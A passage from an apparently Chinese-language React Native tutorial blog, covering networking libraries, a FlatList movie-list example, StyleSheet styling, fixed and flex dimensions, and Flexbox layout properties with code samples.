title="使用其他的网络库"></a>使用其他的网络库</h3><p>React Native 中已经内置了<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener">XMLHttpRequest API</a>(也就是俗称的 ajax)。一些基于 XMLHttpRequest 封装的第三方库也可以使用，例如<a href="https://github.com/niftylettuce/frisbee" target="_blank" rel="noopener">frisbee</a>或是<a href="https://github.com/mzabriskie/axios" target="_blank" rel="noopener">axios</a>等。但注意不能使用 jQuery。</p><blockquote><p>在应用中你可以访问任何网站，没有<a href="http://en.wikipedia.org/wiki/Cross-origin_resource_sharing" target="_blank" rel="noopener">跨域</a>的限制。</p></blockquote><h2 id="电影列表"><a href="#电影列表" class="headerlink" title="电影列表"></a>电影列表</h2><blockquote><p>在一个<code>FlatList</code>中展示出电影列表。</p></blockquote><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>使用<code>cli</code>工具创建一个工程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">react-native init SampleAppMovies</span><br></pre></td></tr></table></figure><p>这条命令除了会下载<code>js</code>文件，还会下载在<code>SampleAppMovies/iOS/SampleAppMovies.xcodeproj</code>和<code>SampleAppMovies/android/app</code>下分别创建一个新的 XCode 工程(iOS)和一个 gradle 工程(Android)。</p><h3 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h3><p><code>Android</code>版本：先连接设备或启动模拟器，然后在<code>SampleAppMovies</code>目录下运行<code>react-native run-android</code>，就会构建工程。</p><h4 id="电影列表-1"><a href="#电影列表-1" class="headerlink" title="电影列表"></a>电影列表</h4><p><img src="/view/posts/e61ae078/movielist.gif" alt="movielist" style="zoom:50%;"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState, Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; View, Text, Button, Alert, Platform, Image, ScrollView, TextInput, FlatList, SectionList, ActivityIndicator, StyleSheet, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原 url</span></span><br><span class="line"><span class="keyword">const</span> REQUEST_URL =  <span class="string">"https://raw.githubusercontent.com/facebook/react-native/0.51-stable/docs/MoviesExample.json"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      data: [],</span><br><span class="line">      loaded: <span class="literal">false</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">this</span>.fetchData = <span class="keyword">this</span>.fetchData.bind(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 请求数据</span></span><br><span class="line">  fetchData() &#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="built_in">require</span>(<span class="string">'./test/moivelist.json'</span>)</span><br><span class="line">    <span class="comment">// 通过定时器 模拟ajax</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">        data: data.movies,</span><br><span class="line">        loaded: <span class="literal">true</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;, <span class="number">3000</span>)</span><br><span class="line">    <span class="comment">// 真正请求的ajax</span></span><br><span class="line">    <span class="comment">// fetch(REQUEST_URL)</span></span><br><span class="line">    <span class="comment">//   .then((response) =&gt; response.json())</span></span><br><span class="line">    <span class="comment">//   .then((responseData) =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     // 注意，这里使用了this关键字，为了保证this在调用时仍然指向当前组件，我们需要对其进行“绑定”操作</span></span><br><span class="line">    <span class="comment">//     this.setState(&#123;</span></span><br><span class="line">    <span class="comment">//       movies: responseData.movies,</span></span><br><span class="line">    <span class="comment">//     &#125;);</span></span><br><span class="line">    <span class="comment">//   &#125;);</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 在生命周期中调用接口</span></span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="keyword">this</span>.fetchData();</span><br><span class="line">  &#125;</span><br><span class="line">  render()&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.state.loaded) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.renderLoadingView();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;FlatList</span><br><span class="line">      data=&#123;<span class="keyword">this</span>.state.data&#125;</span><br><span class="line">      renderItem=&#123;<span class="keyword">this</span>.renderMovie&#125;</span><br><span class="line">      style=&#123;styles.list&#125;</span><br><span class="line">      keyExtractor=&#123;item =&gt; item.id&#125;</span><br><span class="line">    /&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 加载动画</span></span><br><span class="line">  renderLoadingView() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class="line">        &lt;Text&gt;</span><br><span class="line">          正在加载电影数据……</span><br><span class="line">        &lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>View&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 渲染列表</span></span><br><span class="line">  renderMovie(&#123; item &#125;) &#123;</span><br><span class="line">    <span class="comment">// &#123; item &#125;是一种“解构”写法，请阅读ES2015语法的相关文档</span></span><br><span class="line">    <span class="comment">// item也是FlatList中固定的参数名，请阅读FlatList的相关文档</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class="line">        &lt;Image</span><br><span class="line">          source=&#123;&#123;<span class="attr">uri</span>: item.posters.thumbnail&#125;&#125;</span><br><span class="line">          style=&#123;styles.thumbnail&#125;</span><br><span class="line">        /&gt;</span><br><span class="line">        &lt;View style=&#123;styles.rightContainer&#125;&gt;</span><br><span class="line">          &lt;Text style=&#123;styles.title&#125;&gt;&#123;item.title&#125;&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">          &lt;Text style=&#123;styles.year&#125;&gt;&#123;item.year&#125;&lt;/</span>Text&gt;</span><br><span class="line">        &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>View&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> styles = StyleSheet.create(&#123;</span><br><span class="line">  list: &#123;</span><br><span class="line">    paddingTop: <span class="number">20</span>,</span><br><span class="line">    backgroundColor: <span class="string">'#F5FCFF'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  container: &#123;</span><br><span class="line">    flex: <span class="number">1</span>,</span><br><span class="line">    flexDirection: <span class="string">'row'</span>,</span><br><span class="line">    justifyContent: <span class="string">'center'</span>,</span><br><span class="line">    alignItems: <span class="string">'center'</span>,</span><br><span class="line">    backgroundColor: <span class="string">'#F5FCFF'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  rightContainer: &#123;</span><br><span class="line">    flex: <span class="number">1</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  title: &#123;</span><br><span class="line">    fontSize: <span class="number">20</span>,</span><br><span class="line">    marginBottom: <span class="number">8</span>,</span><br><span class="line">    textAlign: <span class="string">'center'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  year: &#123;</span><br><span class="line">    textAlign: <span class="string">'center'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  thumbnail: &#123;</span><br><span class="line">    width: <span class="number">53</span>,</span><br><span class="line">    height: <span class="number">81</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure><h1 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h1><h2 id="RN中的样式"><a href="#RN中的样式" class="headerlink" title="RN中的样式"></a>RN中的样式</h2><p>所有的核心组件都接受名为<code>style</code>的属性。这些样式名基本上是遵循了 web 上的 CSS 的命名，只是按照 JS 的语法要求使用了驼峰命名法，例如将<code>background-color</code>改为<code>backgroundColor</code>。</p><ul><li><p><code>style</code>属性可以是一个普通的 JavaScript 对象</p></li><li><p>使用<code>StyleSheet.create</code>来集中定义组件的样式。</p></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StyleSheet, Text, View &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">LotsOfStyles</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View&gt;</span><br><span class="line">        &lt;Text style=&#123;styles.red&#125;&gt;just red&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Text style=&#123;styles.bigBlue&#125;&gt;just bigBlue&lt;/</span>Text&gt;</span><br><span class="line">        &lt;Text style=&#123;[styles.bigBlue, styles.red]&#125;&gt;bigBlue, then red&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">        &lt;Text style=&#123;[styles.red, styles.bigBlue]&#125;&gt;red, then bigBlue&lt;/</span>Text&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const styles = StyleSheet.create(&#123;</span></span><br><span class="line"><span class="regexp">  bigBlue: &#123;</span></span><br><span class="line"><span class="regexp">    color: 'blue',</span></span><br><span class="line"><span class="regexp">    fontWeight: 'bold',</span></span><br><span class="line"><span class="regexp">    fontSize: 30,</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">  red: &#123;</span></span><br><span class="line"><span class="regexp">    color: 'red',</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br></pre></td></tr></table></figure><h2 id="高度与宽度"><a href="#高度与宽度" class="headerlink" title="高度与宽度"></a>高度与宽度</h2><p>组件的高度和宽度决定了其在屏幕上显示的尺寸。</p><h3 id="指定宽高"><a href="#指定宽高" class="headerlink" title="指定宽高"></a>指定宽高</h3><p>样式中指定固定的<code>width</code>和<code>height</code>。React Native 中的尺寸都是无单位的，表示的是与设备像素密度无关的逻辑像素点。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; View &#125; <span class="keyword">from</span> <span class="string">'react-native'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">FixedDimensionsBasics</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">width</span>: <span class="number">50</span>, <span class="attr">height</span>: <span class="number">50</span>, <span class="attr">backgroundColor</span>: <span class="string">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">width</span>: <span class="number">100</span>, <span class="attr">height</span>: <span class="number">100</span>, <span class="attr">backgroundColor</span>: <span class="string">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">width</span>: <span class="number">150</span>, <span class="attr">height</span>: <span class="number">150</span>, <span class="attr">backgroundColor</span>: <span class="string">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>这样给组件设置尺寸也是一种常见的模式，比如要求在不同尺寸的屏幕上都显示成一样的大小。</p><p><img src="/view/posts/e61ae078/image-20200326151335084.png" alt="image-20200326151335084" style="zoom:50%;"></p><p><strong>注意：此时没法适配多种屏幕大小</strong></p><h3 id="弹性（Flex）宽高"><a href="#弹性（Flex）宽高" class="headerlink" title="弹性（Flex）宽高"></a>弹性（Flex）宽高</h3><p>在组件样式中使用<code>flex</code>可以使其在可利用的空间中动态地扩张或收缩。一般而言我们会使用<code>flex:1</code>来指定某个组件扩张以撑满所有剩余的空间。如果有多个并列的子组件使用了<code>flex:1</code>，则这些子组件会平分父容器中剩余的空间。如果这些并列的子组件的<code>flex</code>值不一样，则谁的值更大，谁占据剩余空间的比例就更大（即占据剩余空间的比等于并列组件间<code>flex</code>值的比）。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;View style=&#123;styles.father&#125;&gt;</span><br><span class="line">      &lt;View style=&#123;styles.son1&#125; /&gt;</span><br><span class="line">      &lt;View style=&#123;styles.son2&#125; /&gt;</span><br><span class="line">      &lt;View style=&#123;styles.son3&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 去掉父View中的`flex: 1`。  ----- View不再具有尺寸，因此子组件也无法再撑开。</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 然后再用`height: 300`来代替父View的`flex: 1` ---- 父View的高度变成300</span></span><br><span class="line"><span class="regexp">const styles = StyleSheet.create(&#123;</span></span><br><span class="line"><span class="regexp">  father: &#123;</span></span><br><span class="line"><span class="regexp">    flex: 1,</span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ flexDirection: "row", /</span><span class="regexp">/ 改变子元素的伸缩方向</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">  son1: &#123;</span></span><br><span class="line"><span class="regexp">    flex: 1,</span></span><br><span class="line"><span class="regexp">    backgroundColor: 'powderblue'</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">  son2: &#123;</span></span><br><span class="line"><span class="regexp">    flex: 2, </span></span><br><span class="line"><span class="regexp">    backgroundColor: 'skyblue'</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">  son3: &#123;</span></span><br><span class="line"><span class="regexp">    flex: 3,</span></span><br><span class="line"><span class="regexp">    backgroundColor: 'steelblue'</span></span><br><span class="line"><span class="regexp">  &#125;,</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br></pre></td></tr></table></figure><p><img src="/view/posts/e61ae078/image-20200326151248022.png" alt="image-20200326151248022" style="zoom:50%;"></p><h2 id="使用Flexbox布局"><a href="#使用Flexbox布局" class="headerlink" title="使用Flexbox布局"></a>使用Flexbox布局</h2><p>Flexbox 可以在不同屏幕尺寸上提供一致的布局结构。</p><p>使用<code>flexDirection</code>、<code>alignItems</code>和 <code>justifyContent</code>三个样式属性就已经能满足大多数布局需求。</p><blockquote><p>React Native 中的 Flexbox 的工作原理和 web 上的 CSS 基本一致，当然也存在少许差异。首先是默认值不同：<code>flexDirection</code>的默认值是<code>column</code>而不是<code>row</code>，而<code>flex</code>也只能指定一个数字值。</p></blockquote><h3 id="Flex"><a href="#Flex" class="headerlink" title="Flex"></a>Flex</h3><p>如上</p><h3 id="Flex-Direction"><a href="#Flex-Direction" class="headerlink" title="Flex Direction"></a>Flex Direction</h3><p><code>flexDirection</code>可以决定布局的<strong>主轴</strong>。<strong>水平轴(<code>row</code>)</strong>方向，竖直轴(<code>column</code>)<strong>方向。默认值是</strong>竖直轴(<code>column</code>)方向。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="comment">// 尝试把`flexDirection`改为`column`看看</span></span><br><span class="line">      &lt;View style=&#123;&#123;<span class="attr">flex</span>: <span class="number">1</span>, <span class="attr">flexDirection</span>: <span class="string">'row'</span>&#125;&#125;&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">width</span>: <span class="number">50</span>, <span class="attr">height</span>: <span class="number">50</span>, <span class="attr">backgroundColor</span>: <span class="string">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">width</span>: <span class="number">50</span>, <span class="attr">height</span>: <span class="number">50</span>, <span class="attr">backgroundColor</span>: <span class="string">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">width</span>: <span class="number">50</span>, <span class="attr">height</span>: <span class="number">50</span>, <span class="attr">backgroundColor</span>: <span class="string">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/view/posts/e61ae078/image-20200326154915534.png" alt="image-20200326154915534" style="zoom:50%;"></p><h3 id="布局方向"><a href="#布局方向" class="headerlink" title="布局方向"></a>布局方向</h3><p><strong>LTR：文本和子项，从左到右排列</strong></p><p>布局方向指定层次结构中子级和文本的布局方向。 布局方向也会影响边的起点和终点。</p><p> 默认情况下，React Native使用LTR布局方向进行布局。 在此模式下，开始是指左，结束是指右。</p><p>LTR（默认值）文本和子项，从左到右排列。 元素的开始处应用的边距和填充在左侧。</p><p>RTL文本和子级，从右到左排列。 应用于元素开始的边距和填充在右侧。</p><h3 id="Justify-Content"><a href="#Justify-Content" class="headerlink" title="Justify Content"></a>Justify Content</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="comment">// 尝试把`justifyContent`改为`center`看看</span></span><br><span class="line">      <span class="comment">// 尝试把`flexDirection`改为`row`看看</span></span><br><span class="line">      &lt;View style=&#123;&#123;</span><br><span class="line">        flex: <span class="number">1</span>,</span><br><span class="line">        flexDirection: <span class="string">'column'</span>, <span class="comment">// 默认纵向布局</span></span><br><span class="line">        justifyContent: <span class="string">'space-between'</span>,</span><br><span class="line">      &#125;&#125;&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">width</span>: <span class="number">100</span>, <span class="attr">height</span>: <span class="number">100</span>, <span class="attr">backgroundColor</span>: <span class="string">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">width</span>: <span class="number">100</span>, <span class="attr">height</span>: <span class="number">100</span>, <span class="attr">backgroundColor</span>: <span class="string">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">width</span>: <span class="number">100</span>, <span class="attr">height</span>: <span class="number">100</span>, <span class="attr">backgroundColor</span>: <span class="string">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/view/posts/e61ae078/image-20200326155234896.png" alt="image-20200326155234896" style="zoom:50%;"></p><h3 id="Align-Items"><a href="#Align-Items" class="headerlink" title="Align Items"></a>Align Items</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="comment">// 尝试把`alignItems`改为`flex-start`看看</span></span><br><span class="line">      <span class="comment">// 尝试把`justifyContent`改为`flex-end`看看</span></span><br><span class="line">      <span class="comment">// 尝试把`flexDirection`改为`row`看看</span></span><br><span class="line">      &lt;View style=&#123;&#123;</span><br><span class="line">        flex: <span class="number">1</span>,</span><br><span class="line">        flexDirection: <span class="string">'column'</span>,</span><br><span class="line">        justifyContent: <span class="string">'center'</span>,</span><br><span class="line">        alignItems: <span class="string">'stretch'</span>,</span><br><span class="line">      &#125;&#125;&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">width</span>: <span class="number">50</span>, <span class="attr">height</span>: <span class="number">50</span>, <span class="attr">backgroundColor</span>: <span class="string">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">height</span>: <span class="number">50</span>, <span class="attr">backgroundColor</span>: <span class="string">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">height</span>: <span class="number">100</span>, <span class="attr">backgroundColor</span>: <span class="string">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/view/posts/e61ae078/image-20200326155524158.png" alt="image-20200326155524158" style="zoom:50%;"></p><h3 id="Align-Self"><a href="#Align-Self" class="headerlink" title="Align Self"></a>Align Self</h3><p>alignSelf具有与alignItems相同的选项和效果，但是不影响容器中的子元素，您可以将此属性应用于单个子元素，以更改其在其父元素中的对齐方式。alignSelf用alignItems覆盖父类设置的任何选项。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;View style=&#123;&#123;</span><br><span class="line">        flex: <span class="number">1</span>,</span><br><span class="line">        flexDirection: <span class="string">'column'</span>,</span><br><span class="line">        justifyContent: <span class="string">'center'</span>,</span><br><span class="line">        alignItems: <span class="string">'stretch'</span>,</span><br><span class="line">      &#125;&#125;&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">height</span>: <span class="number">100</span>, <span class="attr">backgroundColor</span>: <span class="string">'powderblue'</span>&#125;&#125; &gt;</span><br><span class="line">          &lt;Text style=&#123;&#123;<span class="attr">alignSelf</span>: <span class="string">'flex-end'</span>,<span class="attr">weight</span>: <span class="number">50</span>, <span class="attr">height</span>: <span class="number">50</span>, <span class="attr">backgroundColor</span>: <span class="string">'red'</span>&#125;&#125; &gt;子内容&lt;<span class="regexp">/Text&gt;</span></span><br><span class="line"><span class="regexp">        